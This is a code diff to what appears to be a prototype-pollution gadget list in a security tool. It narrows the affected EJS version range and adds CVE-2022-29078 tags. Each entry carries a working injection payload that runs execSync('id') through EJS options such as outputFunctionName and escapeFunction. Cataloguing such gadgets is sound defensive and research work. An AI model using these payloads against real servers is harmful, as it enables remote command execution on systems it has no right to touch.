@@ -271,7 +271,7 @@ export const PP_GADGETS = [
   // EJS — outputFunctionName
   {
     package: 'ejs',
-    versions: '<3.1.10',
+    versions: '<3.1.7',
     cve: 'CVE-2022-29078',
     property: 'outputFunctionName',
     payload: "x;process.mainModule.require('child_process').execSync('id');//",
@@ -283,7 +283,8 @@ export const PP_GADGETS = [
   },
   {
     package: 'ejs',
-    versions: '<3.1.10',
+    versions: '<3.1.7',
+    cve: 'CVE-2022-29078',
     property: 'destructuredLocals',
     payload: ["x;process.mainModule.require('child_process').execSync('id');//"],
     sink: 'Function',
@@ -294,7 +295,8 @@ export const PP_GADGETS = [
   },
   {
     package: 'ejs',
-    versions: '<3.1.10',
+    versions: '<3.1.7',
+    cve: 'CVE-2022-29078',
     property: 'client',
     payload: true,
     sink: 'Function',
@@ -305,7 +307,8 @@ export const PP_GADGETS = [
   },
   {
     package: 'ejs',
-    versions: '<3.1.10',
+    versions: '<3.1.7',
+    cve: 'CVE-2022-29078',
     property: 'escapeFunction',
     payload: "1;return process.mainModule.require('child_process').execSync('id').toString()//",
     sink: 'Function',
